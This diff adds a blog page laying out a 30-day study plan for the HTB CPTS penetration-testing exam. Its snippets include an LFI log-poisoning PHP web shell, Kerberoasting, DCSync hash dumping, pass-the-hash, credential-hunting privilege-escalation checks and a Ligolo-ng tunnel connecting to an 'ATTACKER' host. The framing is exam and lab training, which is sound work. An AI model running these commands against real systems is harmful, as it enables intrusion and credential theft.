@@ -1,0 +1,224 @@
+<% const pageTitle = 'How I\'m Preparing for HTB CPTS in 30 Days'; %>
+<% const metaDesc = 'A practical 30-day CPTS prep guide covering resources, methodology, tools, and daily structure for passing the HTB Certified Penetration Testing Specialist exam.'; %>
+<% const ogPath = '/blog/cpts-30-days'; %>
+<%- contentFor('body') %>
+
+<style>
+.blog-container { max-width: 800px; margin: 0 auto; }
+.blog-header { margin-bottom: 2.5rem; padding-bottom: 1.5rem; border-bottom: 1px solid var(--htb-border); }
+.blog-title { font-size: 1.8rem; font-weight: 700; color: var(--text-primary); line-height: 1.3; margin-bottom: 0.75rem; }
+.blog-meta { display: flex; gap: 1.5rem; font-size: 0.78rem; color: var(--text-muted); font-family: var(--font-mono); }
+.blog-tag { color: var(--htb-green); }
+.blog-body { font-size: 0.875rem; line-height: 1.8; color: var(--text-secondary); }
+.blog-body h2 { font-size: 1.2rem; color: var(--text-primary); margin: 2rem 0 0.75rem; padding-left: 0.75rem; border-left: 3px solid var(--htb-green); font-family: var(--font-mono); }
+.blog-body h3 { font-size: 1rem; color: var(--htb-green); margin: 1.5rem 0 0.5rem; font-family: var(--font-mono); }
+.blog-body p { margin-bottom: 1rem; }
+.blog-body ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+.blog-body li { margin-bottom: 0.4rem; }
+.blog-body code { background: var(--htb-surface); padding: 2px 6px; border-radius: 4px; font-family: var(--font-mono); font-size: 0.82rem; color: var(--htb-green); border: 1px solid var(--htb-border); }
+.blog-body pre { background: var(--htb-surface); border: 1px solid var(--htb-border); border-radius: 8px; padding: 1rem 1.25rem; overflow-x: auto; margin: 1rem 0; }
+.blog-body pre code { background: none; border: none; padding: 0; font-size: 0.8rem; color: var(--text-secondary); }
+.blog-body .tip-box { background: rgba(127,209,100,0.06); border: 1px solid var(--htb-green); border-radius: 8px; padding: 1rem 1.25rem; margin: 1.25rem 0; }
+.blog-body .tip-box strong { color: var(--htb-green); }
+.blog-body strong { color: var(--text-primary); }
+.week-table { width: 100%; border-collapse: collapse; margin: 1rem 0 1.5rem; font-size: 0.8rem; }
+.week-table th { background: var(--htb-surface); color: var(--htb-green); font-family: var(--font-mono); padding: 0.6rem 0.75rem; text-align: left; border: 1px solid var(--htb-border); }
+.week-table td { padding: 0.6rem 0.75rem; border: 1px solid var(--htb-border); color: var(--text-secondary); vertical-align: top; }
+.week-table tr:hover td { background: rgba(127,209,100,0.03); }
+.cta-box { background: var(--htb-surface); border: 1px solid var(--htb-green); border-radius: 10px; padding: 1.5rem; margin-top: 2.5rem; text-align: center; }
+</style>
+
+<div class="blog-container">
+  <div class="blog-header">
+    <h1 class="blog-title">How I'm Preparing for HTB CPTS in 30 Days</h1>
+    <div class="blog-meta">
+      <span>// April 2026</span>
+      <span>~15 min read</span>
+      <span class="blog-tag">#CPTS</span>
+      <span class="blog-tag">#HTB</span>
+      <span class="blog-tag">#PenTest</span>
+    </div>
+  </div>
+
+  <div class="blog-body">
+
+    <p>The <strong>HTB Certified Penetration Testing Specialist (CPTS)</strong> is one of the most respected hands-on cybersecurity certifications available today. Unlike multiple-choice exams, CPTS is a 10-day practical exam where you perform a real penetration test against a multi-machine Active Directory environment and submit a professional report. No braindumps. No shortcuts.</p>
+
+    <p>This is how I'm structuring my 30-day sprint to pass it.</p>
+
+    <div class="tip-box">
+      <strong>Who is this for?</strong> Security professionals with 6+ months of hands-on CTF/lab experience who want a structured, efficient path through the CPTS content. If you're brand new to penetration testing, budget 3-6 months, not 30 days.
+    </div>
+
+    <h2>// Understanding the CPTS Exam</h2>
+
+    <p>Before building a prep plan, you need to understand exactly what the exam tests:</p>
+
+    <ul>
+      <li><strong>Format:</strong> Grey-box — you receive scope document, starting network access, and low-privilege credentials</li>
+      <li><strong>Duration:</strong> 10-day exam window (exploitation + report writing)</li>
+      <li><strong>Environment:</strong> Multi-machine AD network with internal pivot requirements</li>
+      <li><strong>Deliverable:</strong> Professional penetration testing report (this is the submission)</li>
+      <li><strong>Coverage:</strong> Web application testing, Active Directory attacks, privilege escalation, pivoting, and reporting</li>
+    </ul>
+
+    <p>The exam is graded on your <em>report</em>, not on which machines you compromised. A well-written report documenting 5 findings will beat a sloppy report listing 10 findings every time.</p>
+
+    <h2>// The 30-Day Plan</h2>
+
+    <table class="week-table">
+      <tr><th>Days</th><th>Focus</th><th>Deliverable</th></tr>
+      <tr><td>1-7</td><td>Fundamentals + Enumeration modules</td><td>Nmap, Footprinting, Web recon solid</td></tr>
+      <tr><td>8-14</td><td>Web attacks + Exploitation modules</td><td>SQLi, XSS, file inclusion, shells comfortable</td></tr>
+      <tr><td>15-21</td><td>Active Directory (the exam core)</td><td>BloodHound, Kerberoasting, ACL abuse, AD CS</td></tr>
+      <tr><td>22-26</td><td>Privilege escalation + Pivoting</td><td>Linux/Windows privesc, Ligolo-ng, chisel</td></tr>
+      <tr><td>27-28</td><td>Report writing practice</td><td>Write 3 full findings from labs you've done</td></tr>
+      <tr><td>29-30</td><td>Tool setup + weak area review</td><td>Everything installed, templates ready</td></tr>
+    </table>
+
+    <h2>// Week 1: Fundamentals and Enumeration</h2>
+
+    <p>Most people rush through enumeration modules to get to "the fun stuff." This is the wrong approach. Every CPTS machine requires methodical enumeration — the foothold <em>is</em> enumeration.</p>
+
+    <h3>Daily structure:</h3>
+    <ul>
+      <li>Morning (1 hr): Read the module theory</li>
+      <li>Afternoon (2 hrs): Complete all module exercises on HTB</li>
+      <li>Evening (1 hr): Review flashcards + document what you learned</li>
+    </ul>
+
+    <h3>Key focus areas this week:</h3>
+    <ul>
+      <li><strong>Nmap two-pass method</strong> — <code>nmap -p-</code> first, then targeted deep scan</li>
+      <li><strong>SMB null sessions</strong> — <code>enum4linux-ng -A target</code></li>
+      <li><strong>SNMP community strings</strong> — <code>onesixtyone</code> + <code>snmpwalk</code></li>
+      <li><strong>DNS zone transfers</strong> — <code>dig axfr @nameserver domain.com</code></li>
+      <li><strong>Web fuzzing with ffuf</strong> — directories, VHosts, parameters</li>
+    </ul>
+
+    <div class="tip-box">
+      <strong>Week 1 checkpoint:</strong> Can you enumerate a fresh HTB machine and find all open services, usernames, and shares within 30 minutes? If not, spend more time here.
+    </div>
+
+    <h2>// Week 2: Web Application Attacks</h2>
+
+    <p>CPTS has significant web app coverage. The web modules prepare you for finding and exploiting SQL injection, file inclusion, XSS, command injection, and file upload vulnerabilities in real applications — not just toy examples.</p>
+
+    <h3>Priority modules:</h3>
+    <ul>
+      <li>SQL Injection Fundamentals (understand UNION, error-based, blind)</li>
+      <li>File Inclusion (LFI → RCE via log poisoning, PHP wrappers)</li>
+      <li>File Upload Attacks (bypass MIME, extension, and content checks)</li>
+      <li>Command Injection (bypass filters, use various separators)</li>
+      <li>Web Attacks (IDOR, XXE, SSRF — these appear in the exam)</li>
+    </ul>
+
+    <pre><code># LFI to RCE via log poisoning
+curl -s http://target/page.php?file=/var/log/apache2/access.log
+# First: poison the log with PHP code in User-Agent
+curl -A '<?php system($_GET["cmd"]); ?>' http://target/
+# Then: execute commands via LFI
+curl 'http://target/page.php?file=/var/log/apache2/access.log&cmd=id'</code></pre>
+
+    <h2>// Week 3: Active Directory (The Exam Core)</h2>
+
+    <p>This is where the exam is won or lost. The CPTS environment is an Active Directory network. If you don't know AD attacks cold, you will run out of time.</p>
+
+    <h3>Non-negotiable AD skills:</h3>
+
+    <ul>
+      <li><strong>BloodHound</strong> — collect all data, find shortest path to Domain Admins, identify Kerberoastable accounts and DCSync rights</li>
+      <li><strong>Kerberoasting</strong> — <code>GetUserSPNs.py domain/user:pass -dc-ip DC -request</code> → <code>hashcat -m 13100</code></li>
+      <li><strong>AS-REP Roasting</strong> — <code>GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC</code> → <code>hashcat -m 18200</code></li>
+      <li><strong>DCSync</strong> — <code>secretsdump.py domain/admin:pass@DC</code> — dumps all domain hashes</li>
+      <li><strong>Pass-the-Hash</strong> — <code>nxc smb target -u admin -H [NTLM hash]</code></li>
+      <li><strong>ACL Abuse</strong> — ForceChangePassword, GenericWrite for targeted Kerberoasting</li>
+      <li><strong>AD CS ESC1</strong> — <code>certipy find</code>, enroll in vulnerable template, PKINIT to get TGT</li>
+    </ul>
+
+    <pre><code># Complete Kerberoasting chain
+impacket-GetUserSPNs corp.local/svc_user:Password1 -dc-ip 10.10.10.5 -request -outputfile spns.txt
+hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt --force
+
+# DCSync (requires DS-Replication-Get-Changes rights)
+impacket-secretsdump corp.local/admin:Password1@10.10.10.5 -just-dc-ntlm</code></pre>
+
+    <h2>// Week 4: Privilege Escalation and Pivoting</h2>
+
+    <h3>Linux PrivEsc checklist (memorize this order):</h3>
+    <pre><code>sudo -l                           # Sudo rights — fastest path
+find / -perm -4000 2>/dev/null    # SUID binaries
+getcap -r / 2>/dev/null           # Capabilities
+cat /etc/crontab; ls /etc/cron.d  # Cron jobs
+env                               # Environment variables
+cat ~/.bash_history               # Command history
+./linpeas.sh | tee linpeas.txt    # Automated scan</code></pre>
+
+    <h3>Windows PrivEsc checklist:</h3>
+    <pre><code>whoami /priv                          # SeImpersonatePrivilege → PrintSpoofer
+.\winPEAS.exe > peas.txt              # Automated scan
+reg query HKLM /f password /t REG_SZ /s  # Registry creds
+cmdkey /list                          # Stored credentials
+sc qc VulnerableService               # Weak service permissions</code></pre>
+
+    <h3>Pivoting with Ligolo-ng:</h3>
+    <pre><code># Attacker: start proxy
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# Compromised host: connect agent
+./agent -connect ATTACKER:11601 -ignore-cert
+
+# In Ligolo console:
+session         # select session
+start           # start tunnel
+
+# On attacker: add route to internal subnet
+ip route add 172.16.5.0/24 dev ligolo
+# Now scan internal subnet directly — no proxychains needed</code></pre>
+
+    <h2>// Days 27-28: Report Writing Practice</h2>
+
+    <p>Don't write your first real finding during the exam. Practice writing 3 complete findings from machines you've already compromised:</p>
+
+    <ul>
+      <li>Pick a CVE you exploited on an HTB machine</li>
+      <li>Write: title, CVSS 3.1 score with vector string, affected host, numbered PoC steps with screenshots, business impact, remediation steps</li>
+      <li>Time yourself — aim for under 15 minutes per finding</li>
+    </ul>
+
+    <p>Set up SysReptor now: install it, configure your finding templates, and export a test PDF to verify your setup works.</p>
+
+    <h2>// Days 29-30: Pre-Exam Checklist</h2>
+
+    <ul>
+      <li>All tools installed and verified working (<code>certipy --version</code>, <code>nxc --version</code>, etc.)</li>
+      <li>CherryTree/Obsidian note template ready with sections for each host</li>
+      <li>SysReptor running with blank report template</li>
+      <li>VPN connected to HTB, tun0 verified</li>
+      <li>Wordlist directory organized: rockyou, SecLists subdomains, SecLists web-content</li>
+      <li>GitHub cheatsheet/personal notes bookmarked</li>
+      <li>Full night's sleep before exam start</li>
+    </ul>
+
+    <h2>// Key Resources</h2>
+
+    <ul>
+      <li><strong>HTB CPTS Path</strong> — complete 100% of all modules including exercises</li>
+      <li><strong>HackTricks</strong> — the most comprehensive attack reference available</li>
+      <li><strong>GTFOBins</strong> — Linux binary exploitation for privesc</li>
+      <li><strong>LOLBAS</strong> — Windows LOLBin reference</li>
+      <li><strong>ired.team</strong> — outstanding AD attack reference</li>
+      <li><strong>HTB Machines:</strong> Forest, Blackfield, Monteverde, Cascade, Sauna (all AD-focused)</li>
+      <li><strong>This site</strong> — flashcards, exercises, and the mind map to track everything</li>
+    </ul>
+
+    <div class="cta-box">
+      <div style="font-size:1.5rem; margin-bottom:0.5rem;">⚡</div>
+      <div style="font-size:1rem; font-weight:700; color:var(--text-primary); margin-bottom:0.5rem;">Start Your CPTS Journey</div>
+      <p style="color:var(--text-muted); font-size:0.85rem; margin-bottom:1rem;">Use this companion's 40 modules, exercises, flashcards, and mind map to structure your preparation. Everything here is built around the actual CPTS exam objectives.</p>
+      <a href="/modules" class="btn">Browse All Modules</a>
+      <a href="/path" class="btn" style="margin-left:0.75rem; background:transparent; border-color:var(--htb-border); color:var(--text-secondary);">View Full Path</a>
+    </div>
+
+  </div>
+</div>
